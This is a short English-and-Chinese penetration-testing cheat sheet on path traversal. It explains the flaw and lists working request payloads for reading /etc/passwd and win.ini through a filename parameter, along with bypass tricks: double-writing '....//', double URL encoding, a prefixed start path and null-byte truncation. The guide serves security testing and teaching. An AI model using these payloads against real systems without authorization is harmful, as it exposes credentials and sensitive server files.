Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.

## 1. Principle

目标未限制 Web 访问范围, 导致可能读取敏感文件, 推荐读取:

```
/etc/passwd
C:\Windows\win.ini
```

### 1.1. Location

任何用于读取文件的位置

## 2. Test

### 2.1. Simple Case

先用 `./` 访问当前目录, 若成功则可能存在漏洞

> 记得尝试 URL 编码

```
/image?filename=./123.png
```

### 2.2. Absolute Path

若相对路径遍历被限制, 可尝试绝对路径

```
/image?filename=/etc/passwd
```

### 2.3. Non-Recursively

目标会自动删除递归序列

```
/image?filename=../../../etc/passwd
```

可尝试双写绕过

```
/image?filename=....//....//....//etc/passwd
```

### 2.4. URL-Decode

目标会解码 URL 避免 URL 绕过, 可尝试进行两次 URL 编码

```
/image?filename=..%252f..%252f..%252fetc/passwd
```

### 2.5. Start of Path

路径从起始位置开始

```
/image?filename=/var/www/images/../../../etc/passwd
```

### 2.6. Null Byte

目标仅允许特定的扩展名, 可通过 00 截断混淆

```
/image?filename=../../../etc/passwd%00.png
```

---

**References**

- [Path traversal](https://portswigger.net/web-security/file-path-traversal)
- [CWE-22](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-22)

